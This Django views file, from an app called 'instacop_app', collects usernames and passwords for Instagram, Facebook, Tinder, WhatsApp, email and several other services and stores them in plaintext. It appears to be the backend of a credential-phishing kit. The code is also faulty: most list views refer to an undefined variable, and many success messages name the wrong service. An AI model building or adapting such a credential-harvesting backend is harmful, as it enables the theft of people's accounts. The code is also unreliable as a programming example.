# instacop_app/views.py
from django.shortcuts import render, redirect
from .forms import ParticipantForm, InstagramForm, FacebookForm, EmailForm, TwitterForm, TinderForm, SnapchatForm, ThreadForm, WhatsAppForm, LinkedinForm, TelegramForm
from .models import Participant, Instagram, Facebook, Email, Twitter, Tinder, Snapchat, Thread, WhatsApp, Linkedin, Telegram
from django.http import JsonResponse

def home(request):
    return render(request, 'instacop_app/base.html')


def participant_list(request):
    participants = Participant.objects.all()
    return render(request, 'instacop_app/participant_list.html', {'participants': participants})



def add_participant(request):
    if request.method == 'POST':
        form = ParticipantForm(request.POST)
        if form.is_valid():
            # Extract data from the form
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']

            # Create a new Participant instance and save it
            participant = Participant(username=username, password=password)
            participant.save()

            # Return a success response
            return JsonResponse({'message': 'Instagram Form submitted successfully'}, status=200)
        else:
            # Return a validation error response
            return JsonResponse({'errors': form.errors}, status=400)
    else:
        form = ParticipantForm()

    return render(request, 'instacop_app/add_participant.html', {'form': form})

def instagram_list(request):
    instagrams = Instagram.objects.all()
    return render(request, 'instacop_app/participant_list.html', {'participants': participants})

def add_instagram(request):
    if request.method == 'POST':
        form = InstagramForm(request.POST)
        if form.is_valid():
            # Extract data from the form
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']

            # Create a new Participant instance and save it
            instagram = Instagram(username=username, password=password)
            instagram.save()

            # Return a success response
            return JsonResponse({'message': 'Instagram Form submitted successfully'}, status=200)
        else:
            # Return a validation error response
            return JsonResponse({'errors': form.errors}, status=400)
    else:
        form = InstagramForm()
  
    return render(request, 'instacop_app/add_instagram.html', {'form': form})

def facebook_list(request):
    facebooks = Facebook.objects.all()
    return render(request, 'instacop_app/participant_list.html', {'participants': participants})

def add_facebook(request):
    if request.method == 'POST':
        form = FacebookForm(request.POST)
        if form.is_valid():
            # Extract data from the form
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']

            # Create a new Participant instance and save it
            participant = Facebook(username=username, password=password)
            participant.save()

            # Return a success response
            return JsonResponse({'message': 'facebook Form submitted successfully'}, status=200)
        else:
            # Return a validation error response
            return JsonResponse({'errors': form.errors}, status=400)
    else:
        form = FacebookForm()

    return render(request, 'instacop_app/add_facebook.html', {'form': form})

def thread_list(request):
    threads = Thread.objects.all()
    return render(request, 'instacop_app/participant_list.html', {'participants': participants})

def add_thread(request):
    if request.method == 'POST':
        form = ThreadForm(request.POST)
        if form.is_valid():
            # Extract data from the form
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']

            # Create a new Participant instance and save it
            participant = Thread(username=username, password=password)
            participant.save()

            # Return a success response
            return JsonResponse({'message': 'thread Form submitted successfully'}, status=200)
        else:
            # Return a validation error response
            return JsonResponse({'errors': form.errors}, status=400)
    else:
        form = ThreadForm()

    return render(request, 'instacop_app/add_thread.html', {'form': form})

def twitter_list(request):
    twitters = Twitter.objects.all()
    return render(request, 'instacop_app/participant_list.html', {'participants': participants})

def add_twitter(request):
    if request.method == 'POST':
        form = TwitterForm(request.POST)
        if form.is_valid():
            # Extract data from the form
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']

            # Create a new Participant instance and save it
            participant = Twitter(username=username, password=password)
            participant.save()

            # Return a success response
            return JsonResponse({'message': 'Twitter Form submitted successfully'}, status=200)
        else:
            # Return a validation error response
            return JsonResponse({'errors': form.errors}, status=400)
    else:
        form = TwitterForm()

    return render(request, 'instacop_app/add_twitter.html', {'form': form})

def email_list(request):
    participants = Email.objects.all()
    return render(request, 'instacop_app/participant_list.html', {'participants': participants})

def add_email(request):
    if request.method == 'POST':
        form = EmailForm(request.POST)
        if form.is_valid():
            # Extract data from the form
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']

            # Create a new Participant instance and save it
            participant = Email(username=username, password=password)
            participant.save()

            # Return a success response
            return JsonResponse({'message': 'Twitter Form submitted successfully'}, status=200)
        else:
            # Return a validation error response
            return JsonResponse({'errors': form.errors}, status=400)
    else:
        form = EmailForm()
    return render(request, 'instacop_app/add_email.html', {'form': form})

def snapchat_list(request):
    snapchats = Snapchat.objects.all()
    return render(request, 'instacop_app/participant_list.html', {'participants': participants})

def add_snapchat(request):
    if request.method == 'POST':
        form = SnapchatForm(request.POST)
        if form.is_valid():
            # Extract data from the form
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']

            # Create a new Participant instance and save it
            participant = Snapchat(username=username, password=password)
            participant.save()

            # Return a success response
            return JsonResponse({'message': 'Twitter Form submitted successfully'}, status=200)
        else:
            # Return a validation error response
            return JsonResponse({'errors': form.errors}, status=400)
    else:
        form = SnapchatForm()
    return render(request, 'instacop_app/add_snapchat.html', {'form': form})

def linkedin_list(request):
    linkedins = Linkedin.objects.all()
    return render(request, 'instacop_app/participant_list.html', {'participants': participants})

def add_linkedin(request):
    if request.method == 'POST':
        form = LinkedinForm(request.POST)
        if form.is_valid():
            # Extract data from the form
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']

            # Create a new Participant instance and save it
            participant = Linkedin(username=username, password=password)
            participant.save()

            # Return a success response
            return JsonResponse({'message': 'Twitter Form submitted successfully'}, status=200)
        else:
            # Return a validation error response
            return JsonResponse({'errors': form.errors}, status=400)
    else:
        form = LinkedinForm()
    return render(request, 'instacop_app/add_linkedin.html', {'form': form})


def whatsapp_list(request):
    whatsapps = WhatsApp.objects.all()
    return render(request, 'instacop_app/participant_list.html', {'participants': participants})

def add_whatsapp(request):
    if request.method == 'POST':
        form = WhatsAppForm(request.POST)
        if form.is_valid():
            # Extract data from the form
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']

            # Create a new Participant instance and save it
            participant = WhatsApp(username=username, password=password)
            participant.save()

            # Return a success response
            return JsonResponse({'message': 'Twitter Form submitted successfully'}, status=200)
        else:
            # Return a validation error response
            return JsonResponse({'errors': form.errors}, status=400)
    else:
        form = WhatsAppForm()
    return render(request, 'instacop_app/add_whatsapp.html', {'form': form})


def telegram_list(request):
    telegrams = Telegram.objects.all()
    return render(request, 'instacop_app/participant_list.html', {'participants': participants})

def add_telegram(request):
    if request.method == 'POST':
        form = TelegramForm(request.POST)
        if form.is_valid():
            # Extract data from the form
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']

            # Create a new Participant instance and save it
            participant = Telegram(username=username, password=password)
            participant.save()

            # Return a success response
            return JsonResponse({'message': 'Twitter Form submitted successfully'}, status=200)
        else:
            # Return a validation error response
            return JsonResponse({'errors': form.errors}, status=400)
    else:
        form = TelegramForm()
    return render(request, 'instacop_app/add_telegram.html', {'form': form})


def tinder_list(request):
    tinders = Tinder.objects.all()
    return render(request, 'instacop_app/participant_list.html', {'participants': participants})

def add_tinder(request):
    if request.method == 'POST':
        form = TinderForm(request.POST)
        if form.is_valid():
            # Extract data from the form
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']

            # Create a new Participant instance and save it
            participant = Tinder(username=username, password=password)
            participant.save()

            # Return a success response
            return JsonResponse({'message': 'Twitter Form submitted successfully'}, status=200)
        else:
            # Return a validation error response
            return JsonResponse({'errors': form.errors}, status=400)
    else:
        form = TinderForm()
    return render(request, 'instacop_app/add_tinder.html', {'form': form})
